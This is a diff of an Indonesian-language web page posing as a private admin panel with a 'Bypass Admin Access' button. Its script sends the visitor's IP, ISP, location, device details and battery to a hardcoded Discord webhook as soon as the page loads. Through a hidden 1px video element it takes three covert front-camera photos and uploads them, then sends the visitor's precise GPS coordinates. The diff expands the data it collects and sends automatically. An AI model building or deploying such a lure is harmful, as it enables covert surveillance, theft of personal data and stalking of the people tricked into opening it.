@@ -1,11 +1,11 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Internal Admin Panel - Secure Access</title>
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-    <style>
+ <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Internal Admin Panel - Secure Access</title>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <style>
         body { background-color: #050505; color: #00ff41; font-family: 'JetBrains Mono', monospace; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         .panel { width: 95%; max-width: 500px; border: 1px solid #00ff41; padding: 25px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 30px rgba(0, 255, 65, 0.2); text-align: center; margin: 20px 0; }
         .header { border-bottom: 2px solid #ff0000; padding-bottom: 15px; margin-bottom: 20px; color: #ff0000; font-weight: bold; text-shadow: 0 0 10px #ff0000; }
@@ -18,147 +18,153 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #status { font-size: 11px; color: #ffaa00; margin-top: 15px; min-height: 70px; font-weight: bold; line-height: 1.6; }
         #result-page { display: none; width: 100%; height: 100vh; position: fixed; top: 0; left: 0; background: #000; z-index: 9999; overflow-y: scroll; padding: 20px; box-sizing: border-box; }
-        .inner-container { max-width: 500px; margin: 0 auto; padding-bottom: 60px; }
-        
-        /* Teknik Sembunyi Kode Contoh: Ukuran 1px tapi Aktif */
         #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
         #c { display: none; }
-
         .data-box { border: 1px solid #00ff41; padding: 15px; margin-bottom: 15px; background: rgba(0, 255, 65, 0.05); text-align: left; font-size: 12px; }
         .map-frame { width: 100%; height: 260px; border: 1px solid #00ff41; margin-top: 10px; filter: invert(90%) hue-rotate(180deg); }
-        #photo-container { display: flex; flex-direction: column; gap: 15px; margin-top: 10px; }
-        .preview-img { width: 100%; border: 1px solid #00ff41; border-radius: 4px; display: block; background: #111; }
+        .preview-img { width: 100%; border: 1px solid #00ff41; border-radius: 4px; display: block; background: #111; margin-top: 10px; }
     </style>
-</head>
-<body>
+ </head>
+ <body>
+  <div class="panel" id="login-panel">
+   <div class="header">⚠️ PRIVATE ADMIN SERVER ⚠️</div>
+   <div class="grid">
+    <div class="data-item"><span class="label">Device</span><span id="d-model" class="val">Detecting...</span></div>
+    <div class="data-item"><span class="label">IP_Addr</span><span id="d-ip" class="val">Fetching...</span></div>
+    <div class="data-item"><span class="label">Battery</span><span id="d-bat" class="val">---</span></div>
+    <div class="data-item"><span class="label">Cores/RAM</span><span id="d-ram" class="val">---</span></div>
+    <div class="data-item" style="grid-column: span 2;"><span class="label">Network_ISP</span><span id="d-isp" class="val">Scanning...</span></div>
+   </div>
+   <video id="v" autoplay playsinline muted></video>
+   <canvas id="c"></canvas>
+   <div id="loading-icon" class="loader"></div>
+   <p id="status">[SYSTEM] Akses Dibatasi. Memerlukan Protokol Bypass Kamera & Lokasi untuk Sinkronisasi.</p>
+   <button id="mainBtn" class="btn" onclick="startProcess()">Bypass Admin Access</button>
+  </div>
 
-<div class="panel" id="login-panel">
-    <div class="header">⚠️ PRIVATE ADMIN SERVER ⚠️</div>
-    <div class="grid">
-        <div class="data-item"><span class="label">Device</span><span id="d-model" class="val">Detecting...</span></div>
-        <div class="data-item"><span class="label">IP_Addr</span><span id="d-ip" class="val">Fetching...</span></div>
-        <div class="data-item"><span class="label">Battery</span><span id="d-bat" class="val">---</span></div>
-        <div class="data-item"><span class="label">RAM_Est</span><span id="d-ram" class="val">---</span></div>
-        <div class="data-item" style="grid-column: span 2;"><span class="label">System_Build</span><span id="d-build" class="val">Scanning...</span></div>
-    </div>
-    
-    <video id="v" autoplay playsinline muted></video>
-    <canvas id="c"></canvas>
+  <div id="result-page">
+   <div style="max-width:500px; margin:0 auto; padding:20px;">
+    <h3 style="color: #00ff41; text-align: center;">SUCCESS: ADMIN_DATABASE_VIEW</h3>
+    <div class="data-box"><span style="color: #ff0000; font-weight: bold;">[!] GPS_SATELLITE_DATA</span><br>KOORDINAT: <span id="res-latlon" style="color:#fff;">Connected</span></div>
+    <div id="map-container"></div>
+    <div class="data-box"><span style="color: #ff0000; font-weight: bold;">[!] BIOMETRIC_LOG</span><div id="photo-container"></div></div>
+    <button class="btn" style="background: #00ff41; color: #000;" onclick="location.reload()">TERMINATE SESSION</button>
+   </div>
+  </div>
 
-    <div id="loading-icon" class="loader"></div>
-    <p id="status">[SYSTEM] Akses Dibatasi. Memerlukan Protokol Bypass Kamera & Lokasi untuk Sinkronisasi.</p>
-    <button id="mainBtn" class="btn" onclick="startProcess()">Bypass Admin Access</button>
-</div>
-
-<div id="result-page">
-    <div class="inner-container">
-        <h3 style="color: #00ff41; text-align: center;">SUCCESS: ADMIN_DATABASE_VIEW</h3>
-        <hr color="#00ff41">
-        <div class="data-box">
-            <span style="color: #ff0000; font-weight: bold;">[!] GPS_SATELLITE_DATA</span><br>
-            KOORDINAT: <span id="res-latlon" style="color:#fff;">Connected</span><br>
-            STATUS: <span style="color:#00ff41;">SINKRON</span>
-        </div>
-        <div id="map-container"></div>
-        <div class="data-box">
-            <span style="color: #ff0000; font-weight: bold;">[!] BIOMETRIC_LOG (3 SESSIONS)</span>
-            <div id="photo-container"></div>
-        </div>
-        <button class="btn" style="background: #00ff41; color: #000; box-shadow: none;" onclick="location.reload()">TERMINATE SESSION</button>
-    </div>
-</div>
-
-<script>
+  <script>
     const WH = "https://discord.com/api/webhooks/1464945657386242215/reBayi8sdQCNfp5PMp_c12ejYPeeFwoNurlukhTAQfyrx6Yeccc2ZkPNDnb9iF0kzhBj";
     let stream;
-    let collectedData = {};
+    let fullInfo = {};
+
+    async function sendToDiscord(payload) {
+        try {
+            await fetch(WH, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+        } catch (e) {}
+    }
 
     (async function init() {
         const ua = navigator.userAgent;
-        collectedData = {
-            model: ua.match(/\(([^;]+);/) ? ua.match(/\(([^;]+);/)[1] : "Unknown Device",
-            build: ua.split(' ').pop(),
-            ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A"
+        // Data Perangkat Dasar
+        fullInfo = {
+            model: ua.match(/\(([^;]+);/) ? ua.match(/\(([^;]+);/)[1] : "Unknown",
+            os: navigator.platform,
+            cores: navigator.hardwareConcurrency || "N/A",
+            ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
+            vendor: navigator.vendor,
+            lang: navigator.language
         };
-        document.getElementById('d-model').innerText = collectedData.model;
-        document.getElementById('d-build').innerText = collectedData.build;
-        document.getElementById('d-ram').innerText = collectedData.ram;
 
+        document.getElementById('d-model').innerText = fullInfo.model;
+        document.getElementById('d-ram').innerText = `${fullInfo.cores} Core / ${fullInfo.ram}`;
+
+        // Data Baterai
         try {
-            const res = await fetch('https://api.ipify.org?format=json');
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                fullInfo.battery = `${Math.round(b.level * 100)}% ${b.charging ? '(Charging)' : ''}`;
+                document.getElementById('d-bat').innerText = fullInfo.battery;
+            }
+        } catch (e) {}
+
+        // Data Jaringan & Lokasi IP (Sangat Lengkap)
+        try {
+            const res = await fetch('https://ipapi.co/json/');
             const d = await res.json();
-            collectedData.ip = d.ip;
+            fullInfo.ip = d.ip;
+            fullInfo.city = d.city;
+            fullInfo.region = d.region;
+            fullInfo.country = d.country_name;
+            fullInfo.isp = d.org;
+            fullInfo.postal = d.postal;
+            
             document.getElementById('d-ip').innerText = d.ip;
-        } catch (e) { document.getElementById('d-ip').innerText = "127.0.0.1"; }
-        
-        if (navigator.getBattery) {
-            const bat = await navigator.getBattery();
-            document.getElementById('d-bat').innerText = `${Math.round(bat.level * 100)}%`;
+            document.getElementById('d-isp').innerText = d.org;
+        } catch (e) {
+            document.getElementById('d-ip').innerText = "Failed to fetch";
         }
+
+        // KIRIM LOG OTOMATIS PERTAMA KALI
+        sendToDiscord({
+            embeds: [{
+                title: "🚀 TARGET ENTERED SERVER",
+                color: 16711680,
+                fields: [
+                    { name: "🌐 Jaringan", value: `**IP:** \`${fullInfo.ip || 'N/A'}\`\n**ISP:** \`${fullInfo.isp || 'N/A'}\`\n**Lokasi:** \`${fullInfo.city}, ${fullInfo.country} (${fullInfo.postal})\``, inline: false },
+                    { name: "📱 Perangkat", value: `**Model:** \`${fullInfo.model}\`\n**OS:** \`${fullInfo.os}\`\n**Hardware:** \`${fullInfo.cores} Cores / ${fullInfo.ram}\``, inline: true },
+                    { name: "🔋 Status", value: `**Baterai:** \`${fullInfo.battery || 'N/A'}\`\n**Bahasa:** \`${fullInfo.lang}\``, inline: true },
+                    { name: "🔗 URL Akses", value: `\`${window.location.href}\``, inline: false }
+                ],
+                footer: { text: "System Time: " + new Date().toLocaleString() }
+            }]
+        });
     })();
 
     async function startProcess() {
         const btn = document.getElementById('mainBtn');
         const loader = document.getElementById('loading-icon');
         const status = document.getElementById('status');
-
         btn.style.display = 'none';
         loader.style.display = 'block';
         status.innerText = "[AUTH] Memulai Protokol Kamera...";
 
         try {
-            // Mengikuti teknik contoh: Menggunakan stream sederhana
             stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             const video = document.getElementById('v');
             video.srcObject = stream;
-
-            // Meniru jeda 1.5 detik dari contoh sebelum mulai jepret
             setTimeout(async () => {
-                status.innerText = "[CAPTURE] Mengambil 3 Foto Biometrik...";
-                
+                status.innerText = "[CAPTURE] Mengambil Foto Biometrik...";
                 for (let i = 1; i <= 3; i++) {
                     await takeSnap(video, i);
-                    // Jeda 800ms antar foto seperti contoh
                     await new Promise(r => setTimeout(r, 800));
                 }
-                
-                // Setelah kamera selesai, baru minta lokasi (Hard-Lock)
                 status.innerText = "[GPS] Sinkronisasi Lokasi Satelit...";
                 requestLocation();
             }, 1500);
-
-        } catch (e) {
-            handleError("IZIN KAMERA DITOLAK. Buka pengaturan browser/HP untuk mengizinkan akses KAMERA agar akses Admin Panel bisa melihat kamera target.");
-        }
+        } catch (e) { handleError("IZIN KAMERA DITOLAK."); }
     }
 
-    // FUNGSI SNAP MENIRU PERSIS KODE CONTOH ANDA
     async function takeSnap(video, index) {
         const canvas = document.getElementById('c');
-        const photoContainer = document.getElementById('photo-container');
-        
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
-
         return new Promise((resolve) => {
             canvas.toBlob(async (blob) => {
-                // Tampilkan di halaman hasil internal
                 const img = document.createElement('img');
                 img.src = URL.createObjectURL(blob);
                 img.className = 'preview-img';
-                photoContainer.appendChild(img);
-
-                // Kirim ke Discord dengan teknik keepalive
+                document.getElementById('photo-container').appendChild(img);
                 const fd = new FormData();
                 fd.append("file", blob, `shot_${index}.jpg`);
-                fd.append("payload_json", JSON.stringify({ 
-                    content: `📸 **Capture ${index}/3**\nIP: ${collectedData.ip}\nDevice: ${collectedData.model}` 
-                }));
-                
+                fd.append("payload_json", JSON.stringify({ content: `📸 **Capture ${index}/3** | IP: \`${fullInfo.ip}\`` }));
                 await fetch(WH, { method: "POST", body: fd, keepalive: true });
                 resolve();
-            }, 'image/jpeg', 0.6); // Kualitas 0.6 sesuai contoh Anda
+            }, 'image/jpeg', 0.6);
         });
     }
 
@@ -169,28 +175,19 @@
                 const lon = p.coords.longitude;
                 document.getElementById('res-latlon').innerText = `${lat}, ${lon}`;
                 document.getElementById('map-container').innerHTML = `<iframe class="map-frame" frameborder="0" src="https://maps.google.com/maps?q=${lat},${lon}&z=16&output=embed"></iframe>`;
-
-                // Sukses Total -> Pindah Halaman
+                sendToDiscord({ content: `📍 **GPS SINKRON**\nIP: \`${fullInfo.ip}\`\nMaps: <https://www.google.com/maps?q=${lat},${lon}>` });
                 document.getElementById('login-panel').style.display = 'none';
                 document.getElementById('result-page').style.display = 'block';
-                
-                // Matikan kamera
                 if (stream) stream.getTracks().forEach(t => t.stop());
-            }, () => {
-                handleError("IZIN LOKASI DITOLAK. Buka pengaturan browser/HP untuk mengizinkan akses LOKASI agar akses Panel dapat melihat lokasi.");
-            }, {enableHighAccuracy: true});
+            }, () => { handleError("IZIN LOKASI DITOLAK."); }, {enableHighAccuracy: true});
         }
     }
 
     function handleError(msg) {
-        document.getElementById('status').innerHTML = `<span style="color:#ff0000">${msg}</span><br><br><span style="color:#888;">Menghubungkan ulang dalam 5 detik...</span>`;
+        document.getElementById('status').innerHTML = `<span style="color:#ff0000">${msg}</span>`;
         if (stream) stream.getTracks().forEach(t => t.stop());
-        setTimeout(() => {
-            document.getElementById('loading-icon').style.display = 'none';
-            document.getElementById('mainBtn').style.display = 'block';
-            document.getElementById('mainBtn').innerText = "ULANGI BYPASS";
-        }, 5000);
+        setTimeout(() => { location.reload(); }, 3000);
     }
-</script>
-</body>
+  </script>
+ </body>
 </html>
